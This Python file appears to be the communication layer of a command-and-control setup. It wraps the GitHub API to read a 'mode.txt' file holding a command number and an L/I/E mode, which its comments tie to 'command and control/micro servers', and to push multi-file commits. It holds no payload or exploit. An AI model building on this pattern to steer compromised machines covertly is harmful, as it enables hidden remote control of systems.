import base64
import json
import os
import sys
from typing import List, Dict, Optional
import urllib.request

class GitHubRepo:
    def __init__(self, owner: str, repo: str, token: str):
        self.owner = owner
        self.repo = repo
        self.token = token.strip()
        self.api = f"https://api.github.com/repos/{owner}/{repo}"

        # Default ack is 0:
        self.prev_ack_number = 0
        self.ack_number = 0

        # For error handling might be a good idea to have something like this:
        # self.last_mode_recorded = "L"

    def _request(self, method: str, url: str, data=None):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "Python-GitHub-Client"
        }
        if data is not None:
            data = json.dumps(data).encode("utf-8")
        req = urllib.request.Request(url,data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req) as resp:
                body = resp.read().decode()
                return json.loads(body) if body else {}
        except urllib.error.HTTPError as e:

            # Show GitHub's JSON error body so we know what's wrong
            err_body = e.read().decode()
            print(f"GitHub API error {e.code} {e.reason} for {method} {url}:\n{err_body}", file=sys.stderr)

    def get_recent_commits(self, limit: int = 5):
        url = f"{self.api}/commits?per_page={limit}"
        return self._request("GET", url)

    def get_file(self, path: str):
        url = f"{self.api}/contents/{path}"
        resp = self._request("GET", url)
        content = base64.b64decode(resp["content"]).decode("utf-8")
        return content, resp["sha"]

    def update_file(self, path: str, new_content: str, message: str):
        _, sha = self.get_file(path)
        payload = {
            "message": message,
            "content": base64.b64encode(new_content.encode()).decode(),
            "sha": sha,
        }
        url = f"{self.api}/contents/{path}"
        return self._request("PUT", url, payload)

    def create_file(self, path: str, content: str, message: str):
        payload = {
            "message": message,
            "content": base64.b64encode(content.encode()).decode(),
        }
        url = f"{self.api}/contents/{path}"
        return self._request("PUT", url, payload)

    # Using APIs to implement low level git helpers for multi-file commits:
    def get_branch_head(self, branch: str) -> str:
        """Return latest commit SHA for a branch."""
        url = f"{self.api}/git/ref/heads/{branch}"
        resp = self._request("GET", url)
        return resp["object"]["sha"]

    def get_commit_obj(self, sha: str) -> dict:
        url = f"{self.api}/git/commits/{sha}"
        return self._request("GET", url)

    def create_blob(self, content: str) -> str:
        """Create a blob and return its SHA."""
        url = f"{self.api}/git/blobs"
        payload = {
            "encoding": "utf-8",  # GitHub will hash it as a blob...i think?
            "content": content,
        }
        resp = self._request("POST", url, payload)
        return resp["sha"]

    def create_tree(self, base_tree_sha: str, files: Dict[str, str]) -> str:
        """
        Create a new tree from a base tree plus a set of files (path -> content).
        Returns new tree SHA.
        """
        url = f"{self.api}/git/trees"

        tree_entries: List[dict] = []
        for path, content in files.items():
            blob_sha = self.create_blob(content)
            tree_entries.append(
                {
                    "path": path,
                    "mode": "100644",  # some normal file
                    "type": "blob",
                    "sha": blob_sha,
                }
            )

        payload = {
            "base_tree": base_tree_sha,
            "tree": tree_entries,
        }

        resp = self._request("POST", url, payload)
        return resp["sha"]

    def create_commit(self, message: str, tree_sha: str, parents: List[str]) -> str:
        """
        Create a commit object pointing to tree_sha with given parent(s)
        Returns new commit SHA
        """
        url = f"{self.api}/git/commits"
        payload = {
            "message": message,
            "tree": tree_sha,
            "parents": parents,
        }
        resp = self._request("POST", url, payload)
        return resp["sha"]

    def update_branch_ref(self, branch: str, new_sha: str, force: bool = False) -> None:
        """
        Move refs/heads/<branch> to new_sha (like pushing)
        """
        url = f"{self.api}/git/refs/heads/{branch}"
        payload = {
            "sha": new_sha,
            "force": force,
        }
        self._request("PATCH", url, payload)

    # ---------- Helpers for Communication with repo; for mode changing etc. ---------- 

    def can_reach_github(self):
        """Return True if GitHub API is reachable"""
        try:
            req = urllib.request.Request(
                "https://api.github.com",
                headers={"User-Agent": "GitHub-check"},
                method="GET"
            )
            with urllib.request.urlopen(req, timeout=3):
                return True
        except Exception as e:
            print(f"Cannot connect to GitHub because: {e}")
            return False

    def get_mode_from_repo(self, error_message= None, default_mode: str = "L") -> str:
        #NOTE:  This function will also set self.ack_number!
        """
        Read mode.txt from this repo and return its contents
        We are always expecting mode.txt to be in the following format:
        First line: Is the command number (for tracking synchornization b/w command and control/mirco servers)
        Second line: Is the Mode: L/I/E
        Example mode.txt:
            1
            L
        If missing or malformed, returns (default_mode, error_message)
        error_message to relay the issue back to command!
        returns mode, error_message (ideally error message should be None)
        """
        # print("DEBUG: Getting mode from repo...")
        try:
            content, _ = self.get_file("mode.txt")
            print(f"DEBUG: CONTENT: {content}...")
            lines = [line.strip() for line in content.splitlines() if line.strip()]
            print(f"DEBUG: LINES: {lines} and length of lines: {len(lines)}...")
            if len(lines) < 2:
                print("Invalid mode.txt! FIX THE FORMAT!")
                error_message = "Invalid number of lines in mode.txt! FIX THE FORMAT!"
                return default_mode, error_message
            # Store the previous ack number:
            self.prev_ack_number = self.ack_number

            # First line is the command number i.e ack number:
            self.ack_number = int(lines[0])

            # Second line is the mode character eitehr L/I/E:
            mode = lines = lines[1].upper()

            if mode not in ("L","I","E"):
                error_message = "Invalid mode in mode.txt! Expecting either L/I/E! FIX THE FORMAT!"
                print("Invalid mode in mode.txt! Expecting either L/I/E! FIX THE FORMAT!")

            return mode, error_message

        except Exception as e:
            print(f"Failed to read mode from GitHub: {e}", file=sys.stderr)
            error_message = f"Failed to read mode from GitHub: {e}"
            return default_mode, error_message

    # Maybe add this for error handling ?
    def return_error_code_to_repo(self):
        pass


class GitLike:
    """
    Minimal git-like interface supporting multi-file commits via GitHub REST API.

    Usage:
        git = GitLike(repo, branch="feat/serious_injection_cmds")
        git.add("dir/a.txt", "aaa")
        git.add("dir/b.txt", "bbb")
        sha = git.commit("Update A and B together")
    """

    def __init__(self, repo: GitHubRepo, branch: str = "main"):
        self.repo = repo
        self.branch = branch
        self._staging: Dict[str, str] = {}
        self._last_commit_sha: Optional[str] = None

    def add(self, path: str, content: str) -> None:
        """
        Stage a file (full content).
        If called multiple times for same path, last call wins.
        """
        self._staging[path] = content

    def commit_and_push(self, message: str) -> str:
        """
        Create a single commit that includes ALL staged files.
        Returns new commit SHA.
        """
        if not self._staging:
            raise RuntimeError("No staged changes to commit.")

        # 1. Get current branch head commit
        head_sha = self.repo.get_branch_head(self.branch)

        # 2. Get its commit object to discover the base tree
        head_commit = self.repo.get_commit_obj(head_sha)
        base_tree_sha = head_commit["tree"]["sha"]

        # 3. Create a new tree that overlays staged files onto the base tree
        new_tree_sha = self.repo.create_tree(base_tree_sha, self._staging)

        # 4. Create a commit pointing to the new tree
        new_commit_sha = self.repo.create_commit(message, new_tree_sha, [head_sha])

        # 5. Move branch ref to the new commit (like push)
        self.repo.update_branch_ref(self.branch, new_commit_sha)

        # Clear staging and remember the last commit
        self._staging.clear()
        self._last_commit_sha = new_commit_sha

        return new_commit_sha

    def last_commit(self) -> Optional[str]:
        return self._last_commit_sha

